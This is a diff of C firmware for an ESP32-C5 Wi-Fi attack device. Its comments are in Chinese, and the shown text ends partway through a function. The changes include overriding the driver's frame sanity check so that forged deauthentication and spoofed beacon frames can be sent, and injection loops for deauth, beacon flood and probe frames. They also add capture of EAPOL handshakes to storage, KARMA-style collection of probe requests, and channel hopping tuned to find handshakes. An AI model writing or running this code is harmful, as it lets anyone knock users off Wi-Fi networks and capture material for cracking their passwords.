@@ -1,5 +1,5 @@
 /*
- * wifi_attack.c — Wi-Fi 攻击模块实现
+ * wifi_attack.c: Wi-Fi 攻击模块实现
  *
  * 参考:
  *   - ESP-IDF simple_sniffer (cmd_sniffer.c) promiscuous 启动链 / 回调解析
@@ -18,6 +18,12 @@
 #include "rgb_led.h"
 #include "wifi_db.h"
 #include "http_server.h"
+#include "ble_cli.h"
+#include "cap.h"
+#include "hs.h"
+#include "karma.h"
+#include "event_bus.h"
+#include "frame_build.h"
 
 #include <stdatomic.h>
 #include <string.h>
@@ -35,12 +41,44 @@
 #include "esp_timer.h"
 #include "esp_random.h"
 #include "esp_rom_uart.h"
+#include "esp_err.h"
 #include <stdarg.h>
+
+/* 受控看门狗辅助
+ * 关键长跑任务自订阅 + 循环内喂狗. TWDT 未启用时宏为空, 零开销. */
+#if CONFIG_ESP_TASK_WDT_EN
+#include "esp_task_wdt.h"
+#define WDT_ADD()    do { esp_task_wdt_add(NULL); } while (0)
+#define WDT_RESET()  do { esp_task_wdt_reset(); } while (0)
+/* 退出前必须注销: 否则 TCB 内存被新任务复用时, 新任务 add 会报
+ * "task is already subscribed" (实测遇到过). */
+#define WDT_DEL()    do { esp_task_wdt_delete(NULL); } while (0)
+#else
+#define WDT_ADD()    do { } while (0)
+#define WDT_RESET()  do { } while (0)
+#define WDT_DEL()    do { } while (0)
+#endif
+
+/* 注入帧 sanity check 绕过
+ * esp_wifi_80211_tx() 内部调用 ieee80211_raw_frame_sanity_check()
+ * (libnet80211.a, 闭源). 该函数会:
+ *   - 拒绝 deauth/disassoc (subtype 0xC/0xA)
+ *   - STA 模式下拒绝源 MAC 不等于自身 MAC 的帧 (beacon flood / 伪造 BSSID 失败)
+ * 我们在自身代码里定义同名函数, 链接器优先取我们的版本,
+ * 始终返回 0 (ESP_OK) 即放行所有帧. 这是 ESP32 注入工具的标准做法.
+ * 签名按实际调用: ieee80211_raw_frame_sanity_check(ifx, buf, len, en_sys_seq). */
+int ieee80211_raw_frame_sanity_check(int32_t ifx, const void *buf, int32_t len, int32_t en_sys_seq)
+{
+    (void)ifx; (void)buf; (void)len; (void)en_sys_seq;
+    return 0;
+}
 
 static const char *TAG = "WIFI";
 
 /* Direct UART write bypassing stdio lock. Used by inject_task (low prio)
- * to avoid priority-inheritance deadlock with cli_task (high prio) printf. */
+ * to avoid priority-inheritance deadlock with cli_task (high prio) printf.
+ * 同时把这一行事件投递给 BLE 通道 (非阻塞入队, 由 ble_evt_task 限速发出),
+ * 否则 EAPOL/Deauth 命中与作业进度只进串口, 手机端看不到. */
 static void raw_out(const char *fmt, ...)
 {
     char buf[256];
@@ -53,43 +91,230 @@ static void raw_out(const char *fmt, ...)
         for (int i = 0; i < n; i++) {
             esp_rom_output_tx_one_char(buf[i]);
         }
+        ble_event_post(buf);
     }
 }
 
+/* 回调输出预算.
+ * sniffer_cb 跑在 Wi-Fi 驱动任务里, raw_out 走 stdout, BLE 抓包期间还会
+ * 转成 notify 并 sleep. 自测 deauth 时每秒 50 个 deauth 帧, 若每帧都打印,
+ * 驱动任务被拖住, 表现为整机假死. 这里限成每秒 10 行, 超出的丢弃并计数. */
+static _Atomic uint32_t s_cb_out_sec  = 0;
+static _Atomic uint32_t s_cb_out_cnt  = 0;
+static _Atomic uint32_t s_cb_out_drop = 0;
+
+static bool cb_out_allow(void)
+{
+    uint32_t now = (uint32_t)(esp_timer_get_time() / 1000000);
+    if (atomic_load(&s_cb_out_sec) != now) {
+        atomic_store(&s_cb_out_sec, now);
+        atomic_store(&s_cb_out_cnt, 0);
+    }
+    if (atomic_fetch_add(&s_cb_out_cnt, 1) >= 10) {
+        atomic_fetch_add(&s_cb_out_drop, 1);
+        return false;
+    }
+    return true;
+}
+
+
 /* Forward decl: sniff_stop_common is defined later, used by stop_all */
 static void sniff_stop_common(void);
+static void sniff_progress_stop(void);
 
-/* ===================== 模块状态 ===================== */
 static _Atomic wifi_atk_state_t s_state = WIFI_ATK_IDLE;
 static _Atomic uint32_t s_sniff_remaining = 0;   /* 0 = 永续; >0 递减到 0 触发停 */
 static _Atomic uint32_t s_sniff_total     = 0;
 static _Atomic uint8_t  s_sniff_channel   = 0;
 static _Atomic uint32_t s_inject_total    = 0;
 
-static SemaphoreHandle_t s_inject_mtx  = NULL;    /* 同时仅一个注入任务 */
+/* 注入任务在跑与否, 用一个原子标志表示, 不用信号量也不用互斥量.
+ *
+ * 互斥量: FreeRTOS 的互斥量带所有者记录, 而这里获取发生在 CLI 任务、
+ *   释放发生在注入任务, 跨任务 give 会触发 xTaskPriorityDisinherit
+ *   断言并整机重启, 这就是 2.2.0 上 beaconflood 点了没反应的原因.
+ * 二值信号量: 没有所有权约束, 但"先清句柄再 give"的收尾顺序有竞态:
+ *   等待方看到句柄清空就返回了, 信号量的 give 还没发生, 于是后面的
+ *   take 等满 2 秒超时, 表现为"随机启动不了".
+ * 原子标志 + CAS 两个问题都没有, 也不需要 init 里创建任何东西. */
+static _Atomic bool     s_inject_running = false;
 static SemaphoreHandle_t s_stop_sem    = NULL;    /* 唤醒嗅探 stopper 任务 */
-static TaskHandle_t      s_inject_task = NULL;
 static _Atomic bool      s_inject_stop  = false;
 
-/* ===================== 信道轮询任务 ===================== */
+/* 嗅探停止令牌: 0=闲, 1=已请求, 2=stopper 正在收尾.
+ *
+ * 为什么不用"裸 give 二值信号量"了结: 令牌是异步消费的, 计数嗅探到数后在
+ * 驱动回调里 give, stopper 什么时候被调度到是不确定的. 用户紧接着再开一次
+ * 嗅探时, 迟到的 stopper 会把它刚打开的 promiscuous 关掉, 现象是
+ * 「点了开始, 状态栏显示 SNIFF 但一包都收不到」. 和 beacon 那个"点了没反应"
+ * 是同一族缺陷, 只是这条路径不会重启, 更隐蔽.
+ *
+ * 三态里"2=执行中"是新会话的同步栅栏: 新会话起来前先等它落地,
+ * 于是"决策"与"收尾"之间那个会把新会话误杀的窗口被关掉. */
+static _Atomic int       s_stop_state   = 0;
+
+/* 原始帧流 (PKT/HEX) 输出开关.
+ * 默认关闭: 回调运行在 WiFi 驱动任务上下文, printf/fflush/hex 会阻塞驱动任务,
+ * 进而拖垮 WiFi + BLE + CLI (整机假死). 仅在需要有线串口抓包时打开. */
+static _Atomic bool      s_sniff_verbose = false;
+
+/* 嗅探进度任务 (独立低优先级, 每秒输出一行, 不在回调里做任何输出) */
+static TaskHandle_t      s_progress_task = NULL;
+static _Atomic bool      s_progress_run  = false;
+static _Atomic uint32_t  s_progress_gen  = 0;    /* 进度任务会话号 */
+
+/* 信道范围 (ESP32-C5 双频)
+ * 2.4 GHz: 1..14 (14 仅日本, 一般 1..13)
+ * 5   GHz: 36,40,44,48 (UNII-1), 52,56,60,64 (UNII-2A, DFS),
+ *          100..144 (UNII-2C, DFS), 149,153,157,161,165,169,173,177 (UNII-3)
+ * C5 5G 频率上限 5885 MHz (= ch 177), 故 UNII-3 可放宽到 177. */
+static const uint8_t s_channels_2g[]  = {1,2,3,4,5,6,7,8,9,10,11,12,13};
+static const uint8_t s_channels_5g[]  = {
+    36, 40, 44, 48, 52, 56, 60, 64,
+    100,104,108,112,116,120,124,128,132,136,140,144,
+    149,153,157,161,165,169,173,177
+};
+#define N_CH_2G  (sizeof(s_channels_2g)/sizeof(s_channels_2g[0]))
+#define N_CH_5G  (sizeof(s_channels_5g)/sizeof(s_channels_5g[0]))
+
+static bool is_valid_channel(uint8_t ch)
+{
+    if (ch >= 1 && ch <= 14) return true;
+    for (size_t i = 0; i < N_CH_5G; i++) {
+        if (s_channels_5g[i] == ch) return true;
+    }
+    return false;
+}
+
 static _Atomic bool s_channel_rotate = false;
+static _Atomic uint32_t s_rotate_gen = 0;     /* 轮询任务会话号 */
 static _Atomic uint32_t s_dwell_ms = 1000;
+
+/* 自适应信道轮询
+ * 固定 dwell 的问题: 13 个 2.4G 信道里通常只有 1/6/11 有货, 20 多个 5G 信道
+ * 大多是空的, 但每个都停同样久, 等于把 80% 的时间花在空气上.
+ *
+ * 做法: 每个信道记录"命中权重"(Beacon/Data/EAPOL/Deauth), 下一轮按
+ *   份额比 fair_share 的比值给 dwell 加权, 比值夹在 [0.55, 3.0] 之间,
+ * 每扫完一轮全局衰减一半, 让热点搬家后能自然跟上.
+ * 全部是原子操作, 回调里只做一次 fetch_add, 不加锁不阻塞驱动任务. */
+#define CH_IDX_MAX 200
+static _Atomic uint16_t s_ch_hits[CH_IDX_MAX + 1];   /* uint16 够了: 每轮结束会衰减 */
+/* WR-λ 需要"收益率"(帧/秒)而不是"帧数". 只记帧数的话, 停留久的信道天然
+ * 帧多, 形成正反馈, 权重比值会失控, 这正是 实测只跑出
+ * -0.4%(等于白做)的原因. 同时记驻留毫秒数, 两者相除才是可比的量. */
+static _Atomic uint32_t s_ch_listen[CH_IDX_MAX + 1]; /* 该信道累计驻留 ms */
+static _Atomic uint32_t s_rate_mean     = 0;         /* 每轮重算一次, 避免逐信道遍历 */
+static _Atomic uint32_t s_ch_hits_total  = 0;
+static _Atomic uint32_t s_auto_round     = 0;
+static _Atomic uint32_t s_auto_dwell_now = 0;
+static _Atomic bool     s_auto_adaptive  = true;
+
+static inline void chan_hit(uint8_t ch, uint16_t w)
+{
+    if (ch == 0 || ch > CH_IDX_MAX) return;
+    if (!atomic_load(&s_channel_rotate)) return;
+    atomic_fetch_add(&s_ch_hits[ch], w);
+    atomic_fetch_add(&s_ch_hits_total, (uint32_t)w);
+}
+
+/* 一次驻留结束: 把这段驻留时间记到该信道上. 与 chan_hit() 配合构成收益率. */
+static void chan_close(uint8_t ch, uint32_t dwell_ms)
+{
+    if (ch == 0 || ch > CH_IDX_MAX || dwell_ms == 0) return;
+    atomic_fetch_add(&s_ch_listen[ch], dwell_ms);
+}
+
+/* 一轮结束: 命中/驻留同时减半(指数遗忘), 并重算全网收益率均值.
+ * 减半是必须的, 热点搬家、信道拥挤度变化后, 旧样本要尽快失效. */
+static void auto_decay(void)
+{
+    uint32_t sum = 0;
+    int cnt = 0;
+    for (int i = 1; i <= CH_IDX_MAX; i++) {
+        uint16_t h = atomic_load(&s_ch_hits[i]);
+        uint32_t l = atomic_load(&s_ch_listen[i]);
+        if (h) atomic_store(&s_ch_hits[i], (uint16_t)(h / 2));
+        if (l) atomic_store(&s_ch_listen[i], l / 2);
+        /* 至少采过 150ms 才认为这个样本可用, 否则单帧就会算出离谱的速率 */
+        if (l >= 150 && h > 0) {
+            sum += (uint32_t)((uint64_t)h * 1000u / l);
+            cnt++;
+        }
+    }
+    atomic_store(&s_ch_hits_total, atomic_load(&s_ch_hits_total) / 2);
+    atomic_store(&s_rate_mean, cnt ? (sum / (uint32_t)cnt) : 0);
+}
+
+/* WR-λ: dwell(ch) = base × (rate(ch)/rate_mean)^gain
+ * rate 取帧/秒 (与驻留时长无关), 避免"待得久->帧多->待更久"的正反馈 (旧病灶).
+ * 每轮仍遍历全部信道, 只是时长不同, 弱信道不饿死; 找目标比刷单点更有用.
+ * clamp 到 [base/6, base×2]: 下限防独占/空转, 上限防虚假高值把射频钉死. */
+static uint32_t auto_dwell_for(uint8_t ch, uint32_t base)
+{
+    if (!atomic_load(&s_auto_adaptive)) return base;
+    uint32_t mean = atomic_load(&s_rate_mean);
+    if (mean < 2) return base;                /* 还没攒够样本, 先均匀扫一轮 */
+
+    uint32_t h = (ch <= CH_IDX_MAX) ? (uint32_t)atomic_load(&s_ch_hits[ch]) : 0;
+    uint32_t l = (ch <= CH_IDX_MAX) ? atomic_load(&s_ch_listen[ch]) : 0;
+    uint32_t r = (l >= 100) ? (uint32_t)((uint64_t)h * 1000u / l) : mean;
+
+    uint32_t d = (uint32_t)((uint64_t)base * (r + 1) / (mean + 1));
+
+    uint32_t lo = base / 6;
+    if (lo < 60) lo = 60;
+    uint32_t hi = base * 2;
+    if (hi > 2000) hi = 2000;
+    if (hi < lo + 1) hi = lo + 1;
+
+    if (d < lo) d = lo;
+    if (d > hi) d = hi;
+    return d;
+}
 
 static void channel_rotate_task(void *pv)
 {
-    uint8_t ch = 1;
-    while (atomic_load(&s_channel_rotate)) {
+    /* 会话号在创建时固定: 见 sniff_progress_task 里同样的处理.
+     * 轮询任务一轮要在某个信道上停留 dwell 毫秒(默认 300ms), "停→立刻再开"
+     * 时旧任务正睡在这段延时里, 醒来看到标志又亮了就接着干, 于是两个任务
+     * 同时抢着切信道, 表现是自动轮询乱跳、命中率全线掉. 号不对就退出. */
+    uint32_t mine = (uint32_t)(uintptr_t)pv;
+    WDT_ADD();
+    /* 先扫 2.4G 全信道, 再扫 5G 全信道, 循环 */
+    size_t idx_2g = 0, idx_5g = 0;
+    bool band_2g = true;
+    while (atomic_load(&s_channel_rotate) && atomic_load(&s_rotate_gen) == mine) {
+        uint8_t ch;
+        if (band_2g) {
+            ch = s_channels_2g[idx_2g % N_CH_2G];
+            idx_2g++;
+            if (idx_2g >= N_CH_2G) { band_2g = false; idx_2g = 0; }
+        } else {
+            ch = s_channels_5g[idx_5g % N_CH_5G];
+            idx_5g++;
+            if (idx_5g >= N_CH_5G) {
+                band_2g = true; idx_5g = 0;
+                /* 一整轮结束: 老命中率减半, 让热点搬家后权重能跟上 */
+                auto_decay();
+                atomic_fetch_add(&s_auto_round, 1);
+            }
+        }
         esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
         atomic_store(&s_sniff_channel, ch);
         rgb_led_event(RGB_EV_CHAN_SWITCH, 300);
-        ch++;
-        if (ch > 13) ch = 1;
-        vTaskDelay(pdMS_TO_TICKS(atomic_load(&s_dwell_ms)));
+
+        uint32_t base  = atomic_load(&s_dwell_ms);
+        uint32_t dwell = auto_dwell_for(ch, base);
+        atomic_store(&s_auto_dwell_now, dwell);
+        vTaskDelay(pdMS_TO_TICKS(dwell));
+        chan_close(ch, dwell);       /* WR-λ: 记驻留时长, 与命中数算收益率 */
+        WDT_RESET();
     }
+    WDT_DEL();
     vTaskDelete(NULL);
 }
 
-/* ===================== 注入任务参数 ===================== */
 typedef enum {
     INJECT_DEAUTH,
     INJECT_BEACON,
@@ -107,22 +332,116 @@ typedef struct {
     uint32_t interval_ms;
 } inject_args_t;
 
-/* ===================== 嗅探 stopper 任务 (安全停止) ===================== */
+/* 请求停止嗅探 (可从驱动回调上下文调用: 只投递令牌, 不做任何停止动作).
+ * 真正的关 promiscuous 在 stopper 任务里做: promiscuous 回调上下文里
+ * 反向去关 promiscuous 会和驱动自己打架, 这是 stopper 存在的唯一理由. */
+static void sniff_request_stop(void)
+{
+    int expected = 0;
+    atomic_compare_exchange_strong(&s_stop_state, &expected, 1);
+    if (s_stop_sem) xSemaphoreGive(s_stop_sem);
+}
+
+/* 起新会话前的同步栅栏: 把还在飞的停止令牌等落地.
+ * 没有它, 新会话刚 set_promiscuous(true) 就被迟到的 stopper 关掉.
+ * 令牌是 0 时一次都不等, 所以常态开销为零. */
+static void sniff_stop_barrier(void)
+{
+    for (int i = 0; i < 60 && atomic_load(&s_stop_state) != 0; i++) {
+        vTaskDelay(pdMS_TO_TICKS(1));
+    }
+    /* 等不出来就撤销: stopper 醒来发现令牌没了会自己跳过.
+     * 这一句堵住最后一段窗口: 令牌还没被 stopper 领走(仍是 1)时,
+     * 直接让它在 1 上作废, 而不是留着给 stopper 去误伤新会话. */
+    int expected = 1;
+    atomic_compare_exchange_strong(&s_stop_state, &expected, 0);
+}
+
+/* 嗅探 stopper 任务 (安全停止) */
 static void sniff_stopper_task(void *pv)
 {
     while (1) {
         xSemaphoreTake(s_stop_sem, portMAX_DELAY);
+        /* CAS 从 1 抢到 2: 抢不到说明同步路径(命令上下文)已经把令牌吃掉并
+         * 自己收尾过了, 这里再关一次只会补出一行重复的 DONE. */
+        int expected = 1;
+        if (!atomic_compare_exchange_strong(&s_stop_state, &expected, 2)) {
+            continue;
+        }
         /* 唤醒: 执行真正停止 */
         esp_wifi_set_promiscuous(false);
         atomic_store(&s_state, WIFI_ATK_IDLE);
+        sniff_progress_stop();
         rgb_led_set_status(RGB_IDLE);
-        printf("META,WIFI,SNIFF,DONE,total,%u\n",
-               (unsigned)atomic_load(&s_sniff_total));
-        fflush(stdout);
+        raw_out("META,WIFI,SNIFF,DONE,total,%u\n",
+                (unsigned)atomic_load(&s_sniff_total));
+        /* 收尾全部做完才落 0, 新会话据此判断" 可以安全起来了" */
+        atomic_store(&s_stop_state, 0);
     }
 }
 
-/* ===================== promiscuous 回调 ===================== */
+/* 嗅探进度任务
+ * 每秒输出一行进度 (total / 当前信道 / AP 数 / 客户端数),
+ * 供 App 的 HUD 实时显示. 所有输出都在本任务完成, 不占用驱动的回调上下文. */
+static void sniff_progress_task(void *pv)
+{
+    /* 会话号在创建时就固定下来, 不靠运行时再读一次 (那会读到下一次 start
+     * 改过的值, 新任务反而立刻退出). */
+    uint32_t mine = (uint32_t)(uintptr_t)pv;
+    WDT_ADD();
+    uint32_t last = UINT32_MAX;
+    while (atomic_load(&s_progress_run) && atomic_load(&s_progress_gen) == mine) {
+        vTaskDelay(pdMS_TO_TICKS(1000));
+        WDT_RESET();
+        if (!atomic_load(&s_progress_run)) break;
+        if (atomic_load(&s_progress_gen) != mine) break;   /* 已被新会话取代 */
+        uint32_t total = atomic_load(&s_sniff_total);
+        if (total == last) continue;   /* 无新增, 不刷屏 */
+        last = total;
+        /* 普通任务上下文: 可用 printf (会经 __wrap__write_r 被 BLE 捕获) */
+        printf("META,WIFI,SNIFF,PROGRESS,total,%u,channel,%u,aps,%d,clients,%d\n",
+               (unsigned)total,
+               (unsigned)atomic_load(&s_sniff_channel),
+               wifi_db_ap_count(), wifi_db_client_count());
+        fflush(stdout);
+        /* 本任务在命令窗口之外, 进度需经 BLE 事件通道才能到达手机 */
+        {
+            char evt[128];
+            snprintf(evt, sizeof(evt),
+                     "META,WIFI,SNIFF,PROGRESS,total,%u,channel,%u,aps,%d,clients,%d",
+                     (unsigned)total,
+                     (unsigned)atomic_load(&s_sniff_channel),
+                     wifi_db_ap_count(), wifi_db_client_count());
+            ble_event_post(evt);
+        }
+    }
+    s_progress_task = NULL;
+    WDT_DEL();
+    vTaskDelete(NULL);
+}
+
+static void sniff_progress_start(void)
+{
+    /* 用会话号而不是 run 标志判断" 该谁上班".
+     *
+     * 只看 run 标志的话: 进度任务每秒才醒一次, "停→立刻再开" 时旧任务还睡在
+     * vTaskDelay 里, 醒来发现 run 又被新会话置成 true, 就以为还是自己的班,
+     * 于是每做一次" 停→立刻再开" 就多一个进度任务, 每秒重复刷一行 PROGRESS.
+     * 改成" 号不对就退出", 旧任务最多再活一秒, 不会重复输出. */
+    uint32_t g = (uint32_t)atomic_fetch_add(&s_progress_gen, 1) + 1;
+    atomic_store(&s_progress_run, true);
+    if (xTaskCreate(sniff_progress_task, "snprog", 3072,
+                    (void *)(uintptr_t)g, 3, &s_progress_task) != pdPASS) {
+        atomic_store(&s_progress_run, false);
+    }
+}
+
+static void sniff_progress_stop(void)
+{
+    atomic_store(&s_progress_run, false);
+}
+
+/* promiscuous 回调 */
 
 /* 从 mgmt 帧体里提取 SSID IE. 返回写入 dst 的字节数 (不含 nul), 失败 0. */
 static int extract_ssid(const uint8_t *frame, int len, char *dst, int dst_cap)
@@ -137,11 +456,12 @@ static int extract_ssid(const uint8_t *frame, int len, char *dst, int dst_cap)
             int n = slen < dst_cap - 1 ? slen : dst_cap - 1;
             memcpy(dst, frame + off + 2, n);
             dst[n] = '\0';
+            /* 保留 UTF-8 多字节 (中文 SSID 合法), 只清理控制字符.
+             * 原来只要有一个字节 >= 0x80 就整条丢弃, 中文名字的 AP 在
+             * 抓包日志里会被误判成 <hidden>. */
             for (int i = 0; i < n; i++) {
-                if ((unsigned char)dst[i] < 0x20 || (unsigned char)dst[i] > 0x7e) {
-                    dst[0] = '\0';
-                    return 0;
-                }
+                unsigned char c = (unsigned char)dst[i];
+                if (c < 0x20 || c == 0x7f) dst[i] = '?';
             }
             return n;
         }
@@ -171,60 +491,84 @@ static void wifi_sniff_cb(void *buf, wifi_promiscuous_pkt_type_t type)
     uint8_t fsub  = frame_subtype(f);
     int8_t  rssi  = (int8_t)p->rx_ctrl.rssi;
 
-    /* === DOWNGRADE 模式: 只抓 EAPOL 4-way, 不打 PKT 行 (避免刷屏) === */
+    /* DOWNGRADE 模式: 只抓 EAPOL 4-way, 不打 PKT 行 (避免刷屏) */
     if (st == WIFI_ATK_DOWNGRADE) {
+        /* 落盘: 降级模式正是要抓握手, 原始帧必须留一份 */
+        cap_feed(f, (uint16_t)frame_len, rssi, atomic_load(&s_sniff_channel));
+        hs_feed(f, (uint16_t)frame_len, rssi, atomic_load(&s_sniff_channel));
         if (ftype == FC_TYPE_DATA) {
             wifi_db_update_client(f, frame_len, rssi);
             if (wifi_db_check_eapol(f, frame_len, rssi)) {
                 char esrc[18], edst[18];
                 mac_to_str(f + 10, esrc);
                 mac_to_str(f + 4, edst);
-                raw_out("META,WIFI,EAPOL,DETECTED,src,%s,dst,%s\n", esrc, edst);
+                if (cb_out_allow()) {
+                    raw_out("META,WIFI,EAPOL,DETECTED,src,%s,dst,%s\n", esrc, edst);
+                }
                 rgb_led_pulse(80, 80, 80, 0);
             }
         }
         return;
     }
 
-    /* === SNIFF 模式: 正常打 PKT/HEX 行 === */
-    char da[18], sa[18], bssid[18];
-    mac_to_str(f + 4,  da);
-    mac_to_str(f + 10, sa);
-    mac_to_str(f + 16, bssid);
-
-    char ssid[34] = "-";
-    if ((ftype == FC_TYPE_MGMT) && (fsub == 0x8 || fsub == 0x5)) {
-        extract_ssid(f, frame_len, ssid, sizeof(ssid));
-        if (ssid[0] == '\0') { memcpy(ssid, "<hidden>", 9); }
-    }
-    /* Track AP in database (beacon/probe_resp) */
+    /* SNIFF 模式
+     * 关键: 本回调运行在 WiFi 驱动任务上下文. printf/fflush/hex dump 会阻塞
+     * 驱动任务, 进而拖垮 WiFi + BLE + CLI (整机假死, 表现为连上后无任何响应).
+     * 因此这里只做轻量入库 (O(1) 哈希查找) + 计数; 原始帧流仅在 verbose 模式下
+     * 输出 (默认关闭), 常规情况由 DB 快照 (dump aps/clients) + 进度行提供数据. */
+    const uint8_t cur_ch = atomic_load(&s_sniff_channel);
     if (ftype == FC_TYPE_MGMT && (fsub == 0x8 || fsub == 0x5)) {
-        wifi_db_update_ap(f, frame_len, atomic_load(&s_sniff_channel), rssi);
+        wifi_db_update_ap(f, frame_len, cur_ch, rssi);
+        chan_hit(cur_ch, 1);                     /* Beacon/ProbeResp 权重 1 */
     }
-    /* Track clients from data frames */
     if (ftype == FC_TYPE_DATA) {
         wifi_db_update_client(f, frame_len, rssi);
+        chan_hit(cur_ch, 2);                     /* 数据帧权重 2 */
         if (wifi_db_check_eapol(f, frame_len, rssi)) {
+            chan_hit(cur_ch, 8);                 /* EAPOL 才是真正值钱的 */
             char esrc[18], edst[18];
             mac_to_str(f + 10, esrc);
             mac_to_str(f + 4, edst);
-            printf("META,WIFI,EAPOL,DETECTED,src,%s,dst,%s\n", esrc, edst);
-            fflush(stdout);
+            if (cb_out_allow()) {
+                raw_out("META,WIFI,EAPOL,DETECTED,src,%s,dst,%s\n", esrc, edst);
+            }
             rgb_led_pulse(80, 80, 80, 0);
         }
     }
-    /* Passive deauth detection */
     if (ftype == FC_TYPE_MGMT && fsub == 0xc) {
-        printf("META,WIFI,DEAUTH,DETECTED,src,%s,dst,%s,rssi,%d\n", sa, da, rssi);
-        fflush(stdout);
+        chan_hit(cur_ch, 8);                     /* Deauth 密集信道优先 */
+        char sa[18], da[18];
+        mac_to_str(f + 10, sa);
+        mac_to_str(f + 4, da);
+        if (cb_out_allow()) {
+            raw_out("META,WIFI,DEAUTH,DETECTED,src,%s,dst,%s,rssi,%d\n", sa, da, rssi);
+        }
     }
 
-    printf("PKT,WIFI,%s,%s,%d,%d,%s,%s,%s,%s\n",
-           frame_type_str(ftype), frame_subtype_str(ftype, fsub),
-           frame_len, rssi, sa, da, bssid, ssid);
-    fflush(stdout);
+    /* 原始帧落盘: 只做分类 + memcpy 进 PSRAM 暂存环, 绝不碰 flash */
+    cap_feed(f, (uint16_t)frame_len, rssi, atomic_load(&s_sniff_channel));
+    /* EAPOL 握手归档: 同样只做分类 + 拷贝 */
+    hs_feed(f, (uint16_t)frame_len, rssi, atomic_load(&s_sniff_channel));
+    /* KARMA: 收集 Probe Request 里客户端在找的 SSID */
+    karma_feed(f, (int)frame_len, rssi);
 
-    print_hex_line(f, frame_len);
+    /* 原始帧流 (调试用, 默认关闭 — 会阻塞驱动任务) */
+    if (atomic_load(&s_sniff_verbose)) {
+        char da[18], sa[18], bssid[18];
+        char ssid[34] = "-";
+        mac_to_str(f + 4,  da);
+        mac_to_str(f + 10, sa);
+        mac_to_str(f + 16, bssid);
+        if ((ftype == FC_TYPE_MGMT) && (fsub == 0x8 || fsub == 0x5)) {
+            extract_ssid(f, frame_len, ssid, sizeof(ssid));
+            if (ssid[0] == '\0') { memcpy(ssid, "<hidden>", 9); }
+        }
+        printf("PKT,WIFI,%s,%s,%d,%d,%s,%s,%s,%s\n",
+               frame_type_str(ftype), frame_subtype_str(ftype, fsub),
+               frame_len, rssi, sa, da, bssid, ssid);
+        fflush(stdout);
+        print_hex_line(f, frame_len);
+    }
 
     uint32_t total = atomic_fetch_add(&s_sniff_total, 1) + 1;
 
@@ -236,19 +580,28 @@ static void wifi_sniff_cb(void *buf, wifi_promiscuous_pkt_type_t type)
         if (old == 1) {
             /* 标记停止中, 阻止后续回调继续处理 */
             atomic_store(&s_state, WIFI_ATK_IDLE);
-            xSemaphoreGive(s_stop_sem);
+            /* 不能在回调里关 promiscuous (会和驱动打架), 只投递令牌 */
+            sniff_request_stop();
         }
     }
     (void)total;
 }
 
-/* ===================== 注入任务 ===================== */
 
 static void inject_task(void *pv)
 {
     inject_args_t *a = (inject_args_t *)pv;
-    uint32_t sent = 0;
     uint8_t frame[RFTOOL_MAX_FRAME_LEN];
+    uint32_t sent = 0, errs = 0;
+    uint32_t backoff_ms = 0;
+    TickType_t t_start = xTaskGetTickCount();
+    TickType_t led_next = 0;
+    WDT_ADD();
+
+    if (a->channel && is_valid_channel(a->channel)) {
+        esp_wifi_set_channel(a->channel, WIFI_SECOND_CHAN_NONE);
+        atomic_store(&s_sniff_channel, a->channel);
+    }
 
     while (!atomic_load(&s_inject_stop)) {
         if (a->count && sent >= a->count) break;
@@ -267,85 +620,104 @@ static void inject_task(void *pv)
             }
         } else if (a->mode == INJECT_BEACON) {
             uint8_t src[6];
-            esp_fill_random(src, 6);
+            /* 必须走 fb_random_local_mac: 裸 esp_fill_random 有一半概率把
+             * 首字节最低位置 1, 那是多播地址, 客户端会当成坏帧丢掉. */
+            fb_random_local_mac(src);
             char ssid[40];
             uint32_t rnd = (uint32_t)esp_random();
             snprintf(ssid, sizeof(ssid), "%s%u", a->ssid_prefix, (unsigned)(rnd % 10000));
             uint32_t tsf = (uint32_t)(esp_timer_get_time() & 0xffffffff);
             len = mk_beacon_frame(frame, sizeof(frame), src, tsf, 100, a->channel, ssid);
-        } else { /* INJECT_PROBE */
+        } else {
             uint8_t src[6];
-            esp_fill_random(src, 6);
+            fb_random_local_mac(src);
             len = mk_probe_req_frame(frame, sizeof(frame), src, NULL);
         }
 
         if (len > 0) {
             esp_err_t e = esp_wifi_80211_tx(WIFI_IF_STA, frame, len, true);
-            sent++;
-            atomic_store(&s_inject_total, sent);
-            rgb_led_event(RGB_EV_TX_OK, 50);
-            if (e != ESP_OK) {
-                raw_out("META,WIFI,INJECT,ERR,code,%d\n", e);
+            if (e == ESP_OK) {
+                sent++;
+                atomic_store(&s_inject_total, sent);
+                backoff_ms = 0;
+            } else {
+                errs++;
+                /* 驱动发送队列满时继续硬打只会连续失败, 让出 50ms 让它排空 */
+                if (e == ESP_ERR_NO_MEM || e == ESP_ERR_INVALID_STATE) backoff_ms = 50;
+                /* 只报前 3 次与每 100 次, 否则错误会把串口和 BLE 通道刷满 */
+                if (errs <= 3 || (errs % 100) == 0) {
+                    raw_out("META,WIFI,INJECT,ERR,code,%d,name,%s,total,%u\n",
+                            (int)e, esp_err_to_name(e), (unsigned)errs);
+                }
             }
-            /* breath task handles flashing */
+            /* WS2812 编码要占 CPU, 每帧刷一次在 50fps 下没有必要 */
+            TickType_t now = xTaskGetTickCount();
+            if (now >= led_next) {
+                rgb_led_event(RGB_EV_TX_OK, 50);
+                led_next = now + pdMS_TO_TICKS(100);
+            }
         }
 
-        if (a->interval_ms) vTaskDelay(pdMS_TO_TICKS(a->interval_ms));
-        else                vTaskDelay(pdMS_TO_TICKS(20));   /* 默认 ~50 fps */
+        uint32_t wait = a->interval_ms ? a->interval_ms : 20;
+        if (backoff_ms > wait) wait = backoff_ms;
+        vTaskDelay(pdMS_TO_TICKS(wait));
+        WDT_RESET();
     }
 
+    uint32_t elapsed = (uint32_t)((xTaskGetTickCount() - t_start) * portTICK_PERIOD_MS);
     atomic_store(&s_state, WIFI_ATK_IDLE);
     rgb_led_set_status(RGB_IDLE);
-    raw_out("META,WIFI,INJECT,DONE,mode,%d,sent,%u\n",
-            (int)a->mode, (unsigned)sent);
+    /* stopped=1 表示它不是自己跑完的, 而是被 stop / 被新任务顶掉的.
+     * 少了这个字段, 收到的"完成 sent=50"和正常的跑完一模一样. */
+    raw_out("META,WIFI,INJECT,DONE,mode,%d,sent,%u,err,%u,ms,%u,stopped,%u\n",
+            (int)a->mode, (unsigned)sent, (unsigned)errs, (unsigned)elapsed,
+            atomic_load(&s_inject_stop) ? 1u : 0u);
+
+    /* 栈水位: 4096 字节的栈够不够, 用实测数字说话, 不靠估. */
+    UBaseType_t hwm = uxTaskGetStackHighWaterMark(NULL);
+    raw_out("META,WIFI,INJECT,STACK,free_min,%u\n", (unsigned)hwm);
 
